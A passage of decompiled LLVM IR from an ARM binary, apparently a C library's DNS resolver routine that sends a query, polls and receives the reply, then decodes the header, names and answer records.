  %v0_2e888 = load i32, i32* @sl, align 4
  store i32 %v0_2e888, i32* %r1.global-to-local, align 4
  %v4_2e88c = call i32 @__libc_send(i32 %v3_2e858, i32 %v0_2e888, i32 %v2_2e87c, i32 %v0_2e880)
  store i32 878, i32* %r3.global-to-local, align 4
  %v0_2e894 = load i32, i32* @r8, align 4
  %v2_2e894 = add i32 %v0_2e894, 878
  %v3_2e894 = inttoptr i32 %v2_2e894 to i8*
  %v4_2e894 = load i8, i8* %v3_2e894, align 1
  %v6_2e894 = zext i8 %v4_2e894 to i32
  store i32 %v6_2e894, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_2e89c = mul nuw nsw i32 %v6_2e894, 1000
  store i32 %v2_2e89c, i32* @r4, align 4
  store i32 %v2_2e8a0, i32* @r5, align 4
  br label %dec_label_pc_2e8a4

dec_label_pc_2e8a4:                               ; preds = %thread-pre-split, %dec_label_pc_2e87c
  %v0_2e8b4 = phi i32 [ %v1_2e8f0, %thread-pre-split ], [ %v2_2e89c, %dec_label_pc_2e87c ]
  store i32 %v3_2e858, i32* %stack_var_-48, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v0_2e8b4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v8_2e8c4 = call i32 @__GI_poll(i32 %v2_2e8a0, i32 1, i32 %v0_2e8b4, i32 1, i32 %v3_2e858, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_2e8cc = load i32, i32* @sl, align 4
  store i32 %v0_2e8cc, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp223 = icmp slt i32 %v8_2e8c4, 1
  br i1 %tmp223, label %dec_label_pc_2ecc8, label %dec_label_pc_2e8e0

dec_label_pc_2e8e0:                               ; preds = %dec_label_pc_2e8a4
  %v5_2e8e0 = call i32 @__libc_recv(i32 %v3_2e858, i32 %v0_2e8cc, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_2e8e4 = icmp ugt i32 %v5_2e8e0, 10
  store i1 %v2_2e8e4, i1* %cpsr_c.global-to-local, align 1
  %v8_2e8ec = icmp sgt i32 %v5_2e8e0, 11
  br i1 %v8_2e8ec, label %dec_label_pc_2e918, label %dec_label_pc_2e8f0

dec_label_pc_2e8f0:                               ; preds = %dec_label_pc_2e918, %dec_label_pc_2e934, %dec_label_pc_2e8e0
  %v0_2e8f0 = load i32, i32* @r4, align 4
  %v1_2e8f0 = add i32 %v0_2e8f0, -1000
  store i32 %v1_2e8f0, i32* @r4, align 4
  %v7_2e8f0 = icmp eq i32 %v0_2e8f0, 1000
  %tmp286 = zext i1 %v7_2e8f0 to i32
  %. = xor i32 %tmp286, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2e900 = icmp slt i32 %v5_2e8e0, 0
  br i1 %v1_2e900, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_2e8f0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_2ecc8

thread-pre-split:                                 ; preds = %dec_label_pc_2e8f0
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_2e8f0, label %dec_label_pc_2ecc8, label %dec_label_pc_2e8a4

dec_label_pc_2e918:                               ; preds = %dec_label_pc_2e8e0
  %v0_2e918 = load i32, i32* @sl, align 4
  store i32 %v2_2e7cc, i32* %r1.global-to-local, align 4
  %v2_2e920 = inttoptr i32 %v0_2e918 to i8*
  %v3_2e920 = call i32 @__decode_header(i8* %v2_2e920, i32 %v2_2e7cc)
  %v3_2e924 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_2e924, i32* %r3.global-to-local, align 4
  %v3_2e92c = icmp uge i32 %v3_2e924, %v3_2e784
  store i1 %v3_2e92c, i1* %cpsr_c.global-to-local, align 1
  %v9_2e92c = icmp eq i32 %v3_2e924, %v3_2e784
  br i1 %v9_2e92c, label %dec_label_pc_2e934, label %dec_label_pc_2e8f0

dec_label_pc_2e934:                               ; preds = %dec_label_pc_2e918
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_2e938, label %dec_label_pc_2e8f0, label %dec_label_pc_2e940

dec_label_pc_2e940:                               ; preds = %dec_label_pc_2e934
  store i32 %tmp164, i32* %r2.global-to-local, align 4
  store i32 %v1_2e944, i32* %r3.global-to-local, align 4
  store i1 %v2_2e948, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_2e944.cmp, label %dec_label_pc_2e984, label %dec_label_pc_2e950

dec_label_pc_2e950:                               ; preds = %dec_label_pc_2e940
  store i32 %v4_2e60c, i32* %r1.global-to-local, align 4
  store i1 %v2_2e954, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_2e954, label %dec_label_pc_2e970, label %dec_label_pc_2e95c

dec_label_pc_2e95c:                               ; preds = %dec_label_pc_2e950
  store i32 %v4_2e6d0, i32* %r2.global-to-local, align 4
  %v1_2e960 = add i32 %v4_2e6d0, -1
  store i32 %v1_2e960, i32* %r3.global-to-local, align 4
  %v0_2e964 = load i32, i32* @r7, align 4
  %v3_2e964 = icmp uge i32 %v0_2e964, %v1_2e960
  store i1 %v3_2e964, i1* %cpsr_c.global-to-local, align 1
  %v5_2e968 = icmp slt i32 %v0_2e964, %v1_2e960
  br i1 %v5_2e968, label %.thread8, label %dec_label_pc_2e970

.thread8:                                         ; preds = %dec_label_pc_2e95c
  %v7_2e968 = add i32 %v0_2e964, 1
  br label %dec_label_pc_2ecd8

dec_label_pc_2e970:                               ; preds = %dec_label_pc_2e95c, %dec_label_pc_2e950
  store i32 81776, i32* %r3.global-to-local, align 4
  %v0_2e974 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_2e9b4

dec_label_pc_2e984:                               ; preds = %dec_label_pc_2e940
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_2e984, label %dec_label_pc_2e98c, label %dec_label_pc_2ecc8

dec_label_pc_2e98c:                               ; preds = %dec_label_pc_2e984
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp218, label %dec_label_pc_2e9a4, label %dec_label_pc_2e9bc

dec_label_pc_2e9a4:                               ; preds = %dec_label_pc_2e98c
  store i32 81724, i32* %r3.global-to-local, align 4
  %v0_2e9a8 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_2e9b4

dec_label_pc_2e9b4:                               ; preds = %dec_label_pc_2e970, %dec_label_pc_2e9a4
  %storemerge3 = phi i32 [ %v0_2e974, %dec_label_pc_2e970 ], [ %v0_2e9a8, %dec_label_pc_2e9a4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_2e970 ], [ 4, %dec_label_pc_2e9a4 ]
  %storemerge2 = load i32, i32* @global_var_428f0.3141, align 4
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v3_2e9b4 = add i32 %storemerge2, %storemerge3
  %v4_2e9b4 = inttoptr i32 %v3_2e9b4 to i32*
  store i32 %storemerge, i32* %v4_2e9b4, align 4
  br label %dec_label_pc_2ed18

dec_label_pc_2e9bc:                               ; preds = %dec_label_pc_2e98c
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_2e9c0.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @r7, align 4
  %v2_2e9c0 = add i32 %v0_2e9c0.pre, 12
  store i32 %v2_2e9c0, i32* @r4, align 4
  %v3_2e9c0 = icmp ugt i32 %v0_2e9c0.pre, -13
  store i1 %v3_2e9c0, i1* %cpsr_c.global-to-local, align 1
  %v9_2e9c0 = icmp eq i32 %v2_2e9c0, 0
  br i1 %v9_2e9c0, label %dec_label_pc_2ecc8, label %dec_label_pc_2e9c8

dec_label_pc_2e9c8:                               ; preds = %dec_label_pc_2e9bc
  %v2_2e9d0 = add i32 %v5_2e8e0, -12
  store i32 %v2_2e9d0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp227 = icmp slt i32 %v2_2e9d0, 1
  br i1 %tmp227, label %dec_label_pc_2ecc8, label %dec_label_pc_2e9dc

dec_label_pc_2e9d4thread-pre-split:               ; preds = %dec_label_pc_2e9f8
  %v2_2ea0416 = add i32 %v2_2e9e8, -1
  store i32 %v2_2ea0416, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp228 = icmp slt i32 %v2_2ea0416, 1
  br i1 %tmp228, label %dec_label_pc_2ecc8, label %dec_label_pc_2e9dc

dec_label_pc_2e9dc:                               ; preds = %dec_label_pc_2e9c8, %dec_label_pc_2e9d4thread-pre-split
  %v1_2ea00 = phi i32 [ %v2_2ea0416, %dec_label_pc_2e9d4thread-pre-split ], [ %v2_2e9d0, %dec_label_pc_2e9c8 ]
  %v0_2e9dc = phi i32 [ %v2_2e9f0, %dec_label_pc_2e9d4thread-pre-split ], [ %v2_2e9c0, %dec_label_pc_2e9c8 ]
  %v1_2e9dc = inttoptr i32 %v0_2e9dc to i8*
  %v2_2e9dc = load i8, i8* %v1_2e9dc, align 1
  %v3_2e9dc = zext i8 %v2_2e9dc to i32
  store i32 %v3_2e9dc, i32* %r3.global-to-local, align 4
  %v5_2e9dc = add i32 %v0_2e9dc, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2e9e0 = icmp eq i8 %v2_2e9dc, 0
  store i32 %v5_2e9dc, i32* %r2.global-to-local, align 4
  %v2_2e9e8 = sub i32 %v1_2ea00, %v3_2e9dc
  store i32 %v2_2e9e8, i32* @lr, align 4
  %v2_2e9f0 = add i32 %v3_2e9dc, %v5_2e9dc
  br i1 %v2_2e9e0, label %dec_label_pc_2ea0c, label %dec_label_pc_2e9f8

dec_label_pc_2e9f8:                               ; preds = %dec_label_pc_2e9dc
  %v1_2e9ec = and i32 %v3_2e9dc, 192
  %v2_2e9f8 = icmp eq i32 %v1_2e9ec, 192
  store i1 %v2_2e9f8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_2e9f8, label %.thread10, label %dec_label_pc_2e9d4thread-pre-split

.thread10:                                        ; preds = %dec_label_pc_2e9f8
  %v2_2e9fc = add i32 %v0_2e9dc, 2
  store i32 %v2_2e9fc, i32* %r2.global-to-local, align 4
  %v2_2ea00 = add i32 %v1_2ea00, -2
  store i32 %v2_2ea00, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2ea0c

dec_label_pc_2ea0c:                               ; preds = %dec_label_pc_2e9dc, %.thread10
  %v1_2ea18 = phi i32 [ %v2_2e9fc, %.thread10 ], [ %v5_2e9dc, %dec_label_pc_2e9dc ]
  %v0_2ea0c = phi i32 [ %v2_2ea00, %.thread10 ], [ %v1_2ea00, %dec_label_pc_2e9dc ]
  %v1_2ea0c = add i32 %v0_2ea0c, -3
  %v2_2ea0c = icmp ugt i32 %v0_2ea0c, 2
  store i1 %v2_2ea0c, i1* %cpsr_c.global-to-local, align 1
  %v3_2ea0c = sub i32 2, %v0_2ea0c
  %v4_2ea0c = and i32 %v3_2ea0c, %v0_2ea0c
  %v5_2ea0c = icmp slt i32 %v4_2ea0c, 0
  %v6_2ea0c = icmp slt i32 %v1_2ea0c, 0
  %v7_2ea0c = icmp eq i32 %v0_2ea0c, 3
  %v3_2ea10 = xor i1 %v6_2ea0c, %v5_2ea0c
  %v4_2ea10 = or i1 %v7_2ea0c, %v3_2ea10
  br i1 %v4_2ea10, label %dec_label_pc_2ecc8, label %dec_label_pc_2ea14

dec_label_pc_2ea14:                               ; preds = %dec_label_pc_2ea0c
  %v1_2ea14 = sub i32 -8, %v0_2e9c0.pre
  %v2_2ea18 = add i32 %v1_2ea18, %v1_2ea14
  store i32 %v2_2ea18, i32* %r3.global-to-local, align 4
  %v3_2ea18 = icmp ult i32 %v2_2ea18, %v1_2ea14
  store i1 %v3_2ea18, i1* %cpsr_c.global-to-local, align 1
  %v8_2ea18 = icmp slt i32 %v2_2ea18, 0
  br i1 %v8_2ea18, label %dec_label_pc_2ecc8, label %dec_label_pc_2ea3c

dec_label_pc_2ea3c:                               ; preds = %dec_label_pc_2ea14
  %v2_2ea24 = add i32 %v2_2ea18, 12
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_2ea48, i32* @r5, align 4
  %v1_2ea5c = load i32, i32* @sb, align 4
  %v2_2ea5c = inttoptr i32 %v1_2ea5c to i32*
  store i32 0, i32* %v2_2ea5c, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_2ec9c57, label %dec_label_pc_2ea64, label %dec_label_pc_2eca0

dec_label_pc_2ea64:                               ; preds = %dec_label_pc_2ea3c, %dec_label_pc_2ec78
  %stack_var_-460.365 = phi i32 [ %v2_2ec80, %dec_label_pc_2ec78 ], [ %v2_2ea24, %dec_label_pc_2ea3c ]
  %stack_var_-452.062 = phi i32 [ %v1_2ec84, %dec_label_pc_2ec78 ], [ 0, %dec_label_pc_2ea3c ]
  %stack_var_-480.261 = phi i32 [ %stack_var_-480.1, %dec_label_pc_2ec78 ], [ 1, %dec_label_pc_2ea3c ]
  %v0_2ea64 = load i32, i32* @sl, align 4
  store i32 %stack_var_-460.365, i32* @r1, align 4
  store i32 %v5_2e8e0, i32* %r2.global-to-local, align 4
  store i32 %v2_2ea44, i32* %r3.global-to-local, align 4
  store i32 256, i32* @r7, align 4
  %v5_2ea7c = call i32 @__decode_dotted(i32 %v0_2ea64, i32 %stack_var_-460.365, i32 %v5_2e8e0, i32 %v2_2ea44, i32 256)
  store i32 %v5_2ea7c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2ea80 = icmp slt i32 %v5_2ea7c, 0
  br i1 %v1_2ea80, label %dec_label_pc_2eb50, label %dec_label_pc_2ea88

dec_label_pc_2ea88:                               ; preds = %dec_label_pc_2ea64
  %v1_2ea90 = add i32 %v5_2ea7c, 10
  store i32 %v1_2ea90, i32* @fp, align 4
  %v2_2ea94 = sub i32 %v5_2e8e0, %stack_var_-460.365
  %v2_2ea98 = sub i32 %v2_2ea94, %v1_2ea90
  store i32 %v2_2ea98, i32* %r3.global-to-local, align 4
  %v3_2ea98 = icmp uge i32 %v2_2ea94, %v1_2ea90
  store i1 %v3_2ea98, i1* %cpsr_c.global-to-local, align 1
  %v8_2ea98 = icmp slt i32 %v2_2ea98, 0
  br i1 %v8_2ea98, label %dec_label_pc_2eb48.thread, label %dec_label_pc_2eaa8

dec_label_pc_2eb48.thread:                        ; preds = %dec_label_pc_2ea88
  store i32 %v2_2ea98, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_2eb50

dec_label_pc_2eaa8:                               ; preds = %dec_label_pc_2ea88
  %v2_2eaac = call i32 @__GI_strdup(i8* %v1_2eaac)
  %v0_2eab4 = load i32, i32* @r4, align 4
  %v2_2eab4 = add i32 %v0_2eab4, %stack_var_-460.365
  %v0_2eab8 = load i32, i32* @sl, align 4
  %v2_2eab8 = add i32 %v0_2eab8, %v2_2eab4
  store i32 %v2_2eab8, i32* %r1.global-to-local, align 4
  %v1_2eabc = add i32 %v2_2eab8, 2
  %v1_2eac0 = add i32 %v2_2eab8, 4
  store i32 %v1_2eac0, i32* %r3.global-to-local, align 4
  %v1_2eac4 = add i32 %v2_2eab8, 5
  %v2_2eac4 = inttoptr i32 %v1_2eac4 to i8*
  %v3_2eac4 = load i8, i8* %v2_2eac4, align 1
  %v4_2eac4 = zext i8 %v3_2eac4 to i32
  %v2_2eac8 = inttoptr i32 %v1_2eac0 to i8*
  %v3_2eac8 = load i8, i8* %v2_2eac8, align 1
  %v4_2eac8 = zext i8 %v3_2eac8 to i32
  %v1_2eacc = add i32 %v2_2eab8, 8
  %v2_2eacc = inttoptr i32 %v1_2eacc to i8*
  %v3_2eacc = load i8, i8* %v2_2eacc, align 1
  %v4_2eacc = zext i8 %v3_2eacc to i32
  %v1_2ead0 = add i32 %v2_2eab8, 7
  %v2_2ead0 = inttoptr i32 %v1_2ead0 to i8*
  %v3_2ead0 = load i8, i8* %v2_2ead0, align 1
  %v4_2ead0 = zext i8 %v3_2ead0 to i32
  store i32 %v4_2ead0, i32* %r2.global-to-local, align 4
  %v1_2ead8 = add i32 %v2_2eab8, 6
  %v2_2ead8 = inttoptr i32 %v1_2ead8 to i8*
  %v3_2ead8 = load i8, i8* %v2_2ead8, align 1
  %v4_2ead8 = zext i8 %v3_2ead8 to i32
  store i32 %v4_2ead8, i32* %r3.global-to-local, align 4
  %v1_2eadc = add i32 %v2_2eab8, 9
  %v2_2eadc = inttoptr i32 %v1_2eadc to i8*
  %v3_2eadc = load i8, i8* %v2_2eadc, align 1
  %v4_2eadc = zext i8 %v3_2eadc to i32
  %v3_2eae4 = inttoptr i32 %v2_2eab8 to i8*
  %v4_2eae4 = load i8, i8* %v3_2eae4, align 1
  %v6_2eae4 = zext i8 %v4_2eae4 to i32
  %v1_2eae8 = add i32 %v2_2eab8, 3
  %v2_2eae8 = inttoptr i32 %v1_2eae8 to i8*
  %v3_2eae8 = load i8, i8* %v2_2eae8, align 1
  %v4_2eae8 = zext i8 %v3_2eae8 to i32
  store i32 %v4_2eae8, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_2eaec = mul nuw i32 %v4_2eac8, 16777216
  %v5_2eaec = or i32 %v4_2ead0, %v4_2eaec
  store i32 %v5_2eaec, i32* %r2.global-to-local, align 4
  %v2_2eaf0 = inttoptr i32 %v1_2eabc to i8*
  %v3_2eaf0 = load i8, i8* %v2_2eaf0, align 1
  %v4_2eaf0 = zext i8 %v3_2eaf0 to i32
  %v1_2eaf4 = add i32 %v2_2eab8, 1
  %v2_2eaf4 = inttoptr i32 %v1_2eaf4 to i8*
  %v3_2eaf4 = load i8, i8* %v2_2eaf4, align 1
  %v4_2eaf4 = zext i8 %v3_2eaf4 to i32
  %v4_2eaf8 = mul nuw nsw i32 %v4_2eacc, 256
  %v5_2eaf8 = or i32 %v4_2eadc, %v4_2eaf8
  store i32 %v5_2eaf8, i32* @r6, align 4
  store i32 %v4_2eac4, i32* @r7, align 4
  %v4_2eb00 = mul nuw nsw i32 %v6_2eae4, 256
  %v5_2eb00 = or i32 %v4_2eaf4, %v4_2eb00
  store i32 %v5_2eb00, i32* @lr, align 4
  %v4_2eb04 = mul nuw nsw i32 %v4_2eaf0, 256
  %v5_2eb04 = or i32 %v4_2eb04, %v4_2eae8
  store i32 %v5_2eb04, i32* %r3.global-to-local, align 4
  store i32 %v2_2ea98, i32* @r5, align 4
  %v4_2eb10 = mul nuw nsw i32 %v4_2eac4, 65536
  %v5_2eb10 = or i32 %v5_2eaec, %v4_2eb10
  %v4_2eb14 = mul nuw nsw i32 %v4_2ead8, 256
  %v5_2eb14 = or i32 %v5_2eb10, %v4_2eb14
  store i32 %v5_2eb14, i32* %r2.global-to-local, align 4
  %v1_2eb18 = add i32 %v2_2eab8, 10
  store i32 %v1_2eb18, i32* %r1.global-to-local, align 4
  %v1_2eb1c = add i32 %v2_2eab4, 10
  store i32 %v1_2eb1c, i32* @r4, align 4
  %v2_2eb20 = sub i32 %v2_2ea98, %v5_2eaf8
  %v3_2eb20 = icmp uge i32 %v2_2ea98, %v5_2eaf8
  store i1 %v3_2eb20, i1* %cpsr_c.global-to-local, align 1
  %tmp230 = sub i32 0, %v2_2eb20
  %v6_2eb20 = and i32 %v2_2ea98, %tmp230
  %v7_2eb20 = icmp slt i32 %v6_2eb20, 0
  %v8_2eb20 = icmp slt i32 %v2_2eb20, 0
  store i32 %v2_2eaac, i32* %stack_var_-144, align 4
  %v2_2eb40 = xor i1 %v8_2eb20, %v7_2eb20
  br i1 %v2_2eb40, label %dec_label_pc_2eb50, label %dec_label_pc_2eb48

dec_label_pc_2eb48:                               ; preds = %dec_label_pc_2eaa8
  %v0_2eb44 = load i32, i32* @fp, align 4
  %v2_2eb44 = add i32 %v0_2eb44, %v5_2eaf8
  store i32 %v2_2eb44, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2eb48 = icmp slt i32 %v2_2eb44, 0
  br i1 %v1_2eb48, label %dec_label_pc_2eb50, label %dec_label_pc_2eb6c

dec_label_pc_2eb50:                               ; preds = %dec_label_pc_2eb48, %dec_label_pc_2eaa8, %dec_label_pc_2ea64, %dec_label_pc_2eb48.thread
  store i32 %stack_var_-452.062, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2eb54 = icmp eq i32 %stack_var_-452.062, 0
  br i1 %v2_2eb54, label %dec_label_pc_2ecc8, label %dec_label_pc_2eb5c

dec_label_pc_2eb5c:                               ; preds = %dec_label_pc_2eb50
  store i32 %tmp148, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_2eb60, label %dec_label_pc_2ecc8, label %dec_label_pc_2eca0

dec_label_pc_2eb6c:                               ; preds = %dec_label_pc_2eb48
  store i32 %stack_var_-480.261, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2eb70 = icmp eq i32 %stack_var_-480.261, 0
  br i1 %v2_2eb70, label %dec_label_pc_2ec20, label %dec_label_pc_2eb78

dec_label_pc_2eb78:                               ; preds = %dec_label_pc_2eb6c
  %v0_2eb78 = load i32, i32* @sb, align 4
  %v1_2eb78 = add i32 %v0_2eb78, 28
  %v2_2eb78 = inttoptr i32 %v1_2eb78 to i32*
  %v3_2eb78 = load i32, i32* %v2_2eb78, align 4
  store i32 %v3_2eb78, i32* @r3, align 4
  %v1_2eb7c = add i32 %v0_2eb78, 32
  %v2_2eb7c = inttoptr i32 %v1_2eb7c to i32*
  %v3_2eb7c = load i32, i32* %v2_2eb7c, align 4
  store i32 %v3_2eb7c, i32* %r2.global-to-local, align 4
  %v1_2eb80 = add i32 %v0_2eb78, 36
  %v2_2eb80 = inttoptr i32 %v1_2eb80 to i32*
  %v3_2eb80 = load i32, i32* %v2_2eb80, align 4
  store i32 %v3_2eb80, i32* %r1.global-to-local, align 4
  %v1_2eb84 = inttoptr i32 %v0_2eb78 to i32*
  %v2_2eb84 = load i32, i32* %v1_2eb84, align 4
  store i32 %v2_2eb84, i32* @r0, align 4
  %v0_2eb94 = call i32 @free()
  store i32 40, i32* @r2, align 4
  %v0_2eb9c = load i32, i32* @sb, align 4
  store i32 %v0_2eb9c, i32* @r0, align 4
  store i32 %v2_2ea48, i32* @r1, align 4
  %v0_2eba4 = call i32 @memcpy()
  %v0_2eba8 = load i32, i32* @sb, align 4
  %v1_2eba8 = add i32 %v0_2eba8, 4
  %v2_2eba8 = inttoptr i32 %v1_2eba8 to i32*
  %v3_2eba8 = load i32, i32* %v2_2eba8, align 4
  store i32 %v3_2eba8, i32* %r2.global-to-local, align 4
  %v2_2ebac = icmp ugt i32 %v3_2eba8, 23
  store i1 %v2_2ebac, i1* %cpsr_c.global-to-local, align 1
  %v7_2ebac = icmp eq i32 %v3_2eba8, 24
  br i1 %v7_2ebac, label %dec_label_pc_2ebd0, label %dec_label_pc_2ebb4

dec_label_pc_2ebb4:                               ; preds = %dec_label_pc_2eb78
  %v1_2ebb4 = add i32 %v0_2eba8, 28
  %v2_2ebb4 = inttoptr i32 %v1_2ebb4 to i32*
  %v3_2ebb4 = load i32, i32* %v2_2ebb4, align 4
  store i32 %v3_2ebb4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2ebb8 = icmp eq i32 %v3_2ebb4, 0
  br i1 %v2_2ebb8, label %dec_label_pc_2eca0, label %dec_label_pc_2ebc0

dec_label_pc_2ebc0:                               ; preds = %dec_label_pc_2ebb4
  store i1 %v2_2ebc4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_2ebc4, label %dec_label_pc_2ebd0, label %bb231

bb231:                                            ; preds = %dec_label_pc_2ebc0
  store i1 %v3_2ebc8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_2ebc8, label %dec_label_pc_2ebd0, label %dec_label_pc_2eca0

dec_label_pc_2ebd0:                               ; preds = %dec_label_pc_2ebc0, %bb231, %dec_label_pc_2eb78
  store i32 %v0_2e594, i32* %r1.global-to-local, align 4
  %v3_2ebd4 = icmp uge i32 %v3_2eba8, %v0_2e594
  store i1 %v3_2ebd4, i1* %cpsr_c.global-to-local, align 1
  %v9_2ebd4 = icmp eq i32 %v3_2eba8, %v0_2e594
  br i1 %v9_2ebd4, label %dec_label_pc_2ebe4, label %bb232

bb232:                                            ; preds = %dec_label_pc_2ebd0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2ec78

dec_label_pc_2ebe4:                               ; preds = %dec_label_pc_2ebd0
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.062, i32* @r5, align 4
  %v1_2ebec = add i32 %v0_2eba8, 16
  %v2_2ebec = inttoptr i32 %v1_2ebec to i32*
  %v3_2ebec = load i32, i32* %v2_2ebec, align 4
  %v2_2ebf0 = sub i32 %tmp163, %stack_var_-452.062
  %v1_2ebf4 = add i32 %v2_2ebf0, -1
  store i32 %v1_2ebf4, i32* %r3.global-to-local, align 4
  %v1_2ebf8 = add i32 %v3_2ebec, 4
  store i32 %v1_2ebf8, i32* %r2.global-to-local, align 4
  %v2_2ebfc = mul i32 %v1_2ebf8, %v1_2ebf4
  store i32 %v2_2ebfc, i32* %r1.global-to-local, align 4
  %v1_2ec00 = add i32 %v0_2eba8, 32
  %v2_2ec00 = inttoptr i32 %v1_2ec00 to i32*
  %v3_2ec00 = load i32, i32* %v2_2ec00, align 4
  store i32 %v3_2ec00, i32* %r2.global-to-local, align 4
  %v3_2ec04 = icmp uge i32 %v2_2ebfc, %v3_2ec00
  store i1 %v3_2ec04, i1* %cpsr_c.global-to-local, align 1
  %v2_2ec08 = add i32 %v0_2eba8, 36
  %v3_2ec08 = inttoptr i32 %v2_2ec08 to i32*
  store i32 %v1_2ebf4, i32* %v3_2ec08, align 4
  %tmp289 = icmp ugt i32 %v2_2ebfc, %v3_2ec00
  br i1 %tmp289, label %dec_label_pc_2eca0, label %dec_label_pc_2ec10

dec_label_pc_2ec10:                               ; preds = %dec_label_pc_2ebe4
  store i32 0, i32* @r7, align 4
  %v1_2ec18 = load i32, i32* @sb, align 4
  %v2_2ec18 = add i32 %v1_2ec18, 36
  %v3_2ec18 = inttoptr i32 %v2_2ec18 to i32*
  store i32 0, i32* %v3_2ec18, align 4
  br label %dec_label_pc_2ec78

dec_label_pc_2ec20:                               ; preds = %dec_label_pc_2eb6c
  store i32 %v2_2eaac, i32* @r0, align 4
  %v0_2ec24 = call i32 @free()
  store i32 %v5_2eb00, i32* %r3.global-to-local, align 4
  store i32 %v0_2e594, i32* @ip, align 4
  %v3_2ec30 = icmp uge i32 %v5_2eb00, %v0_2e594
  store i1 %v3_2ec30, i1* %cpsr_c.global-to-local, align 1
  %v9_2ec30 = icmp eq i32 %v5_2eb00, %v0_2e594
  br i1 %v9_2ec30, label %dec_label_pc_2ec38, label %dec_label_pc_2ec78

dec_label_pc_2ec38:                               ; preds = %dec_label_pc_2ec20
  %v0_2ec38 = load i32, i32* @sb, align 4
  %v1_2ec38 = add i32 %v0_2ec38, 16
  %v2_2ec38 = inttoptr i32 %v1_2ec38 to i32*
  %v3_2ec38 = load i32, i32* %v2_2ec38, align 4
  store i32 %v3_2ec38, i32* %r1.global-to-local, align 4
  store i32 %v5_2eaf8, i32* %r3.global-to-local, align 4
  %v3_2ec40 = icmp uge i32 %v3_2ec38, %v5_2eaf8
  store i1 %v3_2ec40, i1* %cpsr_c.global-to-local, align 1
  %v9_2ec40 = icmp eq i32 %v3_2ec38, %v5_2eaf8
  br i1 %v9_2ec40, label %dec_label_pc_2ec54, label %dec_label_pc_2ec48

dec_label_pc_2ec48:                               ; preds = %dec_label_pc_2ec38
  %v1_2ec48 = inttoptr i32 %v0_2ec38 to i32*
  %v2_2ec48 = load i32, i32* %v1_2ec48, align 4
  store i32 %v2_2ec48, i32* @r0, align 4
  %v0_2ec4c = call i32 @free()
  br label %dec_label_pc_2ecc8

dec_label_pc_2ec54:                               ; preds = %dec_label_pc_2ec38
  %v1_2ec54 = add i32 %v0_2ec38, 36
  %v2_2ec54 = inttoptr i32 %v1_2ec54 to i32*
  %v3_2ec54 = load i32, i32* %v2_2ec54, align 4
  store i32 %v3_2ec54, i32* %r2.global-to-local, align 4
  %v1_2ec58 = add i32 %v0_2ec38, 28
  %v2_2ec58 = inttoptr i32 %v1_2ec58 to i32*
  %v3_2ec58 = load i32, i32* %v2_2ec58, align 4
  store i32 %v3_2ec58, i32* @r3, align 4
  %v3_2ec5c = mul i32 %v3_2ec54, %v5_2eaf8
  %v4_2ec5c = add i32 %v3_2ec58, %v3_2ec5c
  store i32 %v4_2ec5c, i32* @r0, align 4
  store i32 %v5_2eaf8, i32* @r2, align 4
  store i32 %v1_2eb18, i32* @r1, align 4
  %v0_2ec68 = call i32 @memcpy()
  %v0_2ec6c = load i32, i32* @sb, align 4
  %v1_2ec6c = add i32 %v0_2ec6c, 36
  %v2_2ec6c = inttoptr i32 %v1_2ec6c to i32*
